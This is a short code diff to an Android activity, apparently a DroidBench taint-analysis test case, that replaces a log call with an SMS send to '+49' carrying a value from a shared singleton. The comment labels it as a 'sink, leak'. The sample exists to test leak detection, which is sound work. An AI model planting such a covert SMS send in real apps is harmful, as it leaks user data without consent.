@@ -2,7 +2,8 @@ package edu.mit.to_components_share_memory;
 
 import android.app.Activity;
 import android.os.Bundle;
-import android.util.Log;
+import android.telephony.SmsManager;
+
 import edu.mit.R;
 
 /**
@@ -24,7 +25,8 @@ public class MainActivity extends Activity {
     }
     
     protected void onStop() {
-	Log.i("DroidBench", Singleton.v().s);
+        SmsManager sms = SmsManager.getDefault();
+        sms.sendTextMessage("+49", null, Singleton.v().s, null, null);  //sink, leak
     }
     
 }
